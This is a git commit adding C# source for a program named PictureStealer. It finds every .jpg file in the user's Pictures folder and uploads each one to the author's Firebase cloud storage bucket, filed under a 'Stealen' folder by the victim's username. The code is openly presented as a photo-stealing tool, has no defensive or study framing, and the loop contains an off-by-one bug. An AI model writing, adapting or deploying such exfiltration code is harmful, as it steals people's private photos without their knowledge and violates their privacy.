078bec0bc9276d5d779f8808046c025f75788cc9
bitxanax <bitxanax@gmail.com>
2020-10-06 14:35:38 -0500

    first commit

---
+++ PictureStealer/Files.cs
@@ -0,0 +1,40 @@
+﻿using Firebase.Storage;
+using System;
+using System.Collections.Generic;
+using System.IO;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+
+namespace PictureStealer
+{
+    public class Files
+    {
+        PicturesPath files = new PicturesPath();
+        String[] filePaths;
+        Stream stream;
+        public async void UploadFiles()
+        {
+
+            filePaths = Directory.GetFiles(files.GetPicturesPath(), "*.jpg", SearchOption.AllDirectories);
+
+            for(int i = 0; i <= filePaths.Length; i++)
+            {
+                byte[] imgData = System.IO.File.ReadAllBytes(filePaths[i]);
+                stream = new System.IO.MemoryStream(imgData);
+
+                //===> uploads images to my firebase cloud storage
+                
+                var task = new FirebaseStorage("******.appspot.com")
+                           .Child("Stealen")
+                           .Child(Environment.UserName)
+                           .Child(Path.GetFileName(filePaths[i].ToString()))
+                           .PutAsync(stream);
+
+                var result = await task;
+                //MessageBox.Show(result);
+            }
+        }
+    }
+}
---
+++ PictureStealer/PicturesPath.cs
@@ -0,0 +1,22 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.IO;
+using System.Windows.Forms;
+
+namespace PictureStealer
+{
+    public class PicturesPath
+    {
+        String imagesPath;
+      public String GetPicturesPath()
+        {
+            imagesPath = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures).ToString();
+            return imagesPath;
+
+        }
+    }
+
+}
